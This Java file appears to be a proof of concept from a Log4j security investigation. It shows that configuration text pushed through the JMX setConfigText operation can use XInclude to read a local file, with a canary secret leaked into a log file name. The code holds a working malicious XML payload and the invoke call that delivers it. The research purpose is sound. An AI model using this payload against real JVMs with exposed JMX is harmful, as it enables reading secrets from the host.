// Deliberately NOT in an org.apache.logging.log4j.* package. Answers the
// follow-up to the retracted classpath-shadowing claim and the URL-takeover
// vector (4): is there a way in where the attacker controls the config
// CONTENT directly -- no URL to host or take over, no monitorInterval, no
// env var/property the attacker sets, no filesystem, no CI/CD?
//
// Log4j ships one: LoggerContextAdminMBean.setConfigText(String, String),
// a real JMX-managed operation
// (log4j-core/.../jmx/LoggerContextAdmin.java:201) whose own log message is
// literally "Remote request to reconfigure from config text" -- it exists
// specifically for pushing configuration content to a running JVM over
// JMX, no URL or file involved at all. It runs the pushed text through the
// exact same ConfigurationFactory.getInstance().getConfiguration() path
// every other config source goes through.
//
// This proof drives the real MBean through the real platform MBeanServer
// via a standard javax.management.MBeanServerConnection.invoke() call --
// the same API a remote JMX client uses, just not tunneled over RMI in
// this proof (standing up an unauthenticated-RMI harness would test
// java.rmi, not Log4j). What IS proven directly: once something reaches
// this operation with any content it likes, XInclude fires exactly as
// everywhere else in this investigation.
//
// Is this a Log4j gap, or the feature working as designed? The latter --
// and that's a different answer than the retracted classpath-shadowing
// claim got. LoggerContextAdminMBean is a deliberately designed,
// documented remote-management interface (like java.util.logging's
// LoggingMXBean or any app server's own JMX MBeans); setConfigText()
// reconfiguring from pushed text is correct, intended behavior, not a
// misreading of what the code does. The finding is entirely about WHO can
// reach this operation, which is governed by JMX's own access model, not
// by anything Log4j's own code decides. NOT verified here: whether a
// readonly-role JMX principal (jmxremote.access) can invoke this at all --
// standard JMX access controllers are understood to reserve invoke()
// operations for readwrite roles, which would narrow this vector's real
// precondition to "JMX reachable AND unauthenticated-or-readwrite," not
// just "JMX reachable." Left open rather than assumed either way; see
// CONFIG_DELIVERY_VECTORS.md.

import java.io.File;
import java.io.FileWriter;
import java.lang.management.ManagementFactory;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Set;
import java.util.stream.Stream;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean;

public class XIncludeJmxProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-jmx-d47b-do-not-leak";

    public static void main(String[] args) throws Exception {
        System.out.println(
                "=== XInclude via JMX setConfigText(): attacker-controlled content, no URL at all ===\n");

        File secret = File.createTempFile("xinclude-jmx-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }
        Path exfilDir = Files.createTempDirectory("xinclude-jmx-out");
        exfilDir.toFile().deleteOnExit();

        // One real precondition, set by an operator, not the attacker: Log4j's
        // JMX instrumentation defaults to DISABLED
        // (JmxUtil.isJmxDisabled() defaults true) -- it has to be explicitly
        // turned on. This models that having happened already; the attacker
        // touches nothing about the process's own launch configuration below.
        System.setProperty("log4j2.disable.jmx", "false");

        LoggerContext ctx = null;
        try {
            ctx = (LoggerContext) LogManager.getContext(
                    XIncludeJmxProof.class.getClassLoader(), false, null);
            ctx.getLogger(XIncludeJmxProof.class).info("benign startup");

            MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
            ObjectName pattern = new ObjectName(String.format(LoggerContextAdminMBean.PATTERN, "*"));
            Set<ObjectName> found = mbs.queryNames(pattern, null);
            assertTrue("LoggerContextAdmin MBean is registered on the platform MBeanServer " + found, !found.isEmpty());
            if (found.isEmpty()) {
                System.exit(1);
            }
            ObjectName contextAdmin = found.iterator().next();

            String maliciousXml = "<?xml version=\"1.0\"?>\n"
                    + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\">\n"
                    + "  <Properties>\n"
                    + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                    + "\" parse=\"text\"/></Property>\n"
                    + "  </Properties>\n"
                    + "  <Appenders>\n"
                    + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                    + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                    + "    </File>\n"
                    + "  </Appenders>\n"
                    + "  <Loggers>\n"
                    + "    <Root level=\"INFO\"><AppenderRef ref=\"Exfil\"/></Root>\n"
                    + "  </Loggers>\n"
                    + "</Configuration>\n";

            // Exactly what a remote JMX client (e.g. an unauthenticated JMX/RMI
            // endpoint -- a real, well-documented, independent misconfiguration
            // class) would send: raw config text, no URL, no file, no
            // monitorInterval, nothing on this process's own launch environment
            // touched at all.
            mbs.invoke(
                    contextAdmin,
                    "setConfigText",
                    new Object[] {maliciousXml, "UTF-8"},
                    new String[] {"java.lang.String", "java.lang.String"});

            ctx.getLogger(XIncludeJmxProof.class).info("trigger after remote reconfigure");
        } finally {
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
            System.clearProperty("log4j2.disable.jmx");
        }

        assertTrue(
                "pushing config TEXT directly through the real LoggerContextAdminMBean "
                        + "(no URL, no file, no monitorInterval, no env var the attacker set) "
                        + "leaked the secret",
                exfilContainsCanary(exfilDir));

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println("\nThe attacker's payload here is not a URL to host, not a file to write, and\n"
                + "not something that needs to already be trusted and later taken over -- it is\n"
                + "the config content itself, sent directly, the moment the attacker reaches this\n"
                + "operation. The one real precondition -- log4j2.disable.jmx=false (Log4j's own\n"
                + "instrumentation is OFF by default, JmxUtil.isJmxDisabled() defaults true) AND\n"
                + "the JVM's own JMX remote management reachable, commonly without auth in real\n"
                + "misconfigured deployments -- is set by an operator choice, not by the attacker,\n"
                + "and is a real, well-documented, independent vulnerability class (unauthenticated\n"
                + "exposed JMX) with its own established history outside Log4j entirely. This\n"
                + "proof does not stand up a real remote RMI/JMX listener -- it invokes the same\n"
                + "operation through the local platform MBeanServer, which is what a remote JMX\n"
                + "client's call arrives as once past the RMI transport; that transport step was\n"
                + "not what needed testing here, the Log4j-side handling of arbitrary pushed\n"
                + "config text was.");
    }

    private static boolean exfilContainsCanary(Path exfilDir) throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
